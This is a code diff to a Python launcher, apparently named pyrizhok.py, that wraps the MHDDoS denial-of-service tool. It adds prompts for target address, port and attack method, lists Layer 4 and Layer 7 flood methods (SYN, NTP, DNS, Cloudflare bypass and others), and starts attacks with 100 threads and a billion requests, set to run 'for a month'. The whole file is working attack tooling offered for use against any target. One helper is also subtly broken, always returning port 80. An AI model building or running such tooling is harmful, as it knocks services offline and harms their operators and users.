@@ -1,4 +1,5 @@
 import sys
+import time
 from sys import argv
 
 import colorama
@@ -6,6 +7,7 @@ from humanfriendly.terminal import ansi_wrap
 
 from MHDDoS.start import start, ToolsConsole
 from utils import print_vpn_warning, supports_complex_colors, is_valid_ipv4
+import validators
 
 
 def print_flair():
@@ -30,6 +32,125 @@ def print_flair():
     print(ansi_wrap("Initializing...\n", color=GREEN))
 
 
+def print_notice(message: str):
+    print(ansi_wrap(message, color='blue'))
+
+
+def print_warning(message: str):
+    print(ansi_wrap(message, color='yellow'))
+
+
+def print_error(message: str):
+    print(ansi_wrap(message, color='red'))
+
+
+def receive_target_address_from_input() -> str:
+    address = input(f"Provide target {ansi_wrap('address', color='green')}: ")
+    return address
+
+
+def validate_target_address(address: str):
+    # validate
+    if not address:
+        print_error("Target address not specified, aborting execution.")
+        sys.exit(1)
+    elif validators.ipv4(address):
+        # print(f"IPv4 {address}")
+        pass
+    else:
+        address = ToolsConsole.ensure_http_present(address)
+        if validators.url(address):
+            # print(f"URL {address}")
+            pass
+        else:
+            print_error(f"Target address ('{address}') is not a valid URL nor an IPv4 address. Aborting execution.")
+            sys.exit(1)
+
+    return address
+
+
+def get_default_port_for_address(address: str) -> int:
+    # select default port based on the address/protocol
+    default_port = 80
+    if validators.url(address):
+        protocol = address.split("://")[0]
+        if protocol == "http":
+            default_port = 80
+        elif protocol == "https":
+            default_port = 443
+
+    return 80
+
+
+def receive_target_port_from_input(address: str) -> str:
+    default_port = get_default_port_for_address(address)
+    port = input(f"Provide target {ansi_wrap('port', color='green')} (skip for default = {default_port}): ")
+    if not port:
+        port = default_port
+    return port
+
+
+def validate_target_port(port: str) -> str:
+    # check if it is an integer
+    try:
+        port = int(port)
+        if port < 1 or port > 65535:
+            raise ValueError
+    except ValueError:
+        print_error(f"Invalid port provided: {port}. Port must be an integer value in range [1..65535]. Aborting execution.")
+        sys.exit(1)
+
+    return str(port)
+
+
+def receive_attack_method_from_input(default_method: str) -> str:
+    method = input(f"Provide attack {ansi_wrap('method', color='green')} (skip for default = {default_method}): ")
+    if not method:
+        method = default_method
+    return method
+
+
+layer_4_attack_methods = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "MINECRAFT", "DNS", "CHAR", "ARD", "RDP"]
+layer_7_attack_methods = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM",
+                          "BYPASS", "BOMB"]
+
+
+def validate_attack_method(port: str, method: str, default_method: str) -> str:
+    if method == default_method:
+        return method
+
+    port = int(port)
+    is_layer_7_port = port == 80 or port == 443
+    if is_layer_7_port and (method in layer_7_attack_methods):
+        print_notice(f"Overriding attack method to '{method}' (Layer 7).")
+    elif method in layer_4_attack_methods:
+        print_notice(f"Overriding attack method to '{method}' (Layer 4).")
+    elif method in layer_7_attack_methods:
+        print_warning(f"Provided attack method ('{method}') if for Layer 7 attack, but the selected port ({port}) is from Layer 4. Layer 7 attack requires port 80 or 443.\n"
+                      f"Will use the default Layer 4 method: '{default_method}'. If you want to execute Layer 7 attack, restart with port 80 or 443.\n")
+    else:
+        print_warning(f"Invalid attack method provided: '{method}'.\n"
+                      f"Will use the default Layer 4 method: '{default_method}'. If you want to override it, restart with one of the valid options:\n"
+                      f"    For Layer 4: {', '.join(layer_4_attack_methods)}\n"
+                      f"    For Layer 7: {', '.join(layer_7_attack_methods)}\n")
+        method = default_method
+
+    return method
+
+
+def get_target_ip_address(address: str) -> str:
+    if validators.ipv4(address):
+        return address
+
+    url_no_protocol = address.split("://")[1]
+    dns_info = ToolsConsole.info(url_no_protocol)
+    if not dns_info["success"]:
+        print_error(f"Port provided, but IP address of '{address}' could not be found. Cannot proceed.")
+        sys.exit(1)
+
+    return dns_info['ip']
+
+
 def kara():
     print_flair()
     print_vpn_warning()
@@ -37,60 +158,49 @@ def kara():
     # Init variables
     address = None
     port = None
-    protocol = None
+    method = None
 
-    # override script name
+    # Override script name
     argv[0] = "pyrizhok.py"
 
     # Parse target address
     if len(argv) < 2:
-        address = input("Enter target address: ")
-        if not address:
-            print("Target not specified, aborting execution.")
-            sys.exit(1)
-        argv.insert(1, address)
-    address = argv[1]
+        address = receive_target_address_from_input()
+        # quietly allow to pass other arguments together with the address, space-separated
+        all_address_args = address.split(" ")
+        if len(all_address_args) > 1:
+            print_notice("Multiple arguments passed with the target address. Validating...")
+        for i in range(len(all_address_args)):
+            argv.insert(i + 1, all_address_args[i])
+    if len(argv) > 1:
+        address = validate_target_address(argv[1])
 
-    # Parse port
-    default_protocol = "UDP"
+    # Parse target port
+    if len(argv) < 3:
+        port = receive_target_port_from_input(address)
+        argv.insert(2, str(port))
     if len(argv) > 2:
-        port = argv[2]
+        port = validate_target_port(argv[2])
 
-        try:
-            port = int(port)
-        except ValueError:
-            print(f"Invalid port provided ({port}). Port must be an integer value in range [1..65535]. Aborting execution.")
-            sys.exit(1)
-
-        print(f"Port provided ({port}). Using {default_protocol} mode...")
-
-        # If we have the port, bot no IP address, we need to get the IP of the target
-        if not is_valid_ipv4(address):
-            dns_info = ToolsConsole.info(address)
-            if not dns_info["success"]:
-                print(f"Port provided, but IP address of '{address}' could not be found. Cannot proceed.")
-                sys.exit(1)
-
-            address = dns_info['ip']
-
-    # Parse protocol
-    protocol = default_protocol
+    # Parse attack method
+    default_method = "UDP"
+    method = default_method
+    if len(argv) < 4:
+        method = receive_attack_method_from_input(default_method)
+        argv.insert(3, method)
     if len(argv) > 3:
-        protocol = argv[3]
-        available_protocols = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "MINECRAFT", "DNS", "CHAR", "ARD", "RDP"]
-        if protocol in available_protocols:
-            print(f"Overriding attack protocol to '{protocol}'.")
-        else:
-            protocol = default_protocol
-            print(f"Invalid attack protocol provided: {protocol}. Will use the protocol selected by default ({default_protocol}').\n"
-                  f"If you want to override it, restart with one of the valid options: {','.join(available_protocols)}\n")
+        method = validate_attack_method(port, argv[3], default_method)
+
+    # Use IP if attacking layer 4
+    if method in layer_4_attack_methods:
+        address = get_target_ip_address(address)
 
     hardcoded_n_threads = 100
     hardcoded_n_requests = 1000000000
 
-    if not port or port == 80 or port == 443:
+    if method in layer_7_attack_methods:
         # Prepare URL attack arguments
-        argv[1] = "GET"
+        argv[1] = method
         argv.insert(2, address)
         argv.insert(3, "5")
         argv.insert(4, f"{hardcoded_n_threads}")
@@ -103,7 +213,7 @@ def kara():
             argv.pop(-1)
     else:
         # Prepare IP attack arguments
-        argv[1] = f"{protocol if protocol else default_protocol}"
+        argv[1] = method
         argv.insert(2, f"{address}:{port}")
         argv.insert(3, f"{hardcoded_n_threads}")
         argv.insert(4, "44640")  # keep bombarding for a month!
@@ -118,6 +228,7 @@ def kara():
     print()
     print(f"Initiating attack with the following MHDDoS parameters:\n     {' '.join(argv[1:])}")
     print()
+    time.sleep(1)
 
     start()
 
@@ -134,4 +245,4 @@ if __name__ == '__main__':
 
     colorama.deinit()
 
-    input("\nExecution finished.\nPress ENTER to exit... ")
+    input("Execution finished.\nPress ENTER to exit... ")
